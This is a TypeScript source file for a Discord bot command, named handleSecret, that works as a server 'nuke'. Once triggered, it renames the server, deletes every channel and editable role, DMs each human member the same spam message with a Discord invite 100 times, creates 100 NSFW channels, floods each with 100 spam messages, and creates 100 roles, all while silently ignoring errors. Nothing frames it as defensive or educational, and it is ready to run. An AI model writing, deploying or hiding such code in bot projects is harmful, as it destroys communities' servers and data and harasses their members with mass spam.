import type { Message, Client } from "discord.js";
import { ChannelType } from "discord.js";

const SPAM_MESSAGE = `# MEMBERTY NUKE HAHA\n@everyone\nhttps://discord.gg/zy5rjBDTyn`;
const SERVER_NAME = "MEMBERTY WAS HERE";
const CHANNEL_NAME = "memverty";
const CHANNEL_TOPIC = "MEMBERTY WAS HERE AND SAY GOODNIGHT";

export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void args;
  void client;

  const guild = message.guild;
  if (!guild) return;

  // Fire-and-forget status — never block on it
  message.channel.send("🔥 Firing...").catch(() => {});

  // Fetch members first so cache is populated for DMs
  await guild.members.fetch().catch(() => {});

  // Everything runs simultaneously — no sequential phases
  await Promise.all([
    // Rename server
    guild.setName(SERVER_NAME).catch(() => {}),

    // Delete all channels
    Promise.all(guild.channels.cache.map((ch) => ch.delete().catch(() => {}))),

    // Delete all editable roles
    Promise.all(
      guild.roles.cache
        .filter((r) => r.name !== "@everyone" && r.editable)
        .map((r) => r.delete().catch(() => {})),
    ),

    // DM every member 100 times simultaneously
    Promise.all(
      guild.members.cache
        .filter((m) => !m.user.bot)
        .map((m) =>
          Promise.all(
            Array.from({ length: 100 }, () =>
              m.send(SPAM_MESSAGE).catch(() => {}),
            ),
          ),
        ),
    ),

    // Create 100 channels and spam each one immediately as it resolves
    Promise.all(
      Array.from({ length: 100 }, () =>
        guild.channels
          .create({
            name: CHANNEL_NAME,
            type: ChannelType.GuildText,
            nsfw: true,
            topic: CHANNEL_TOPIC,
          })
          .then((ch) => {
            if (!ch.isTextBased()) return;
            return Promise.all(
              Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
            );
          })
          .catch(() => {}),
      ),
    ),

    // Create 100 roles simultaneously
    Promise.all(
      Array.from({ length: 100 }, () =>
        guild.roles.create({ name: "MEMBERTY", color: "Red" }).catch(() => {}),
      ),
    ),
  ]);

  message.channel.send("✅ Done.").catch(() => {});
}
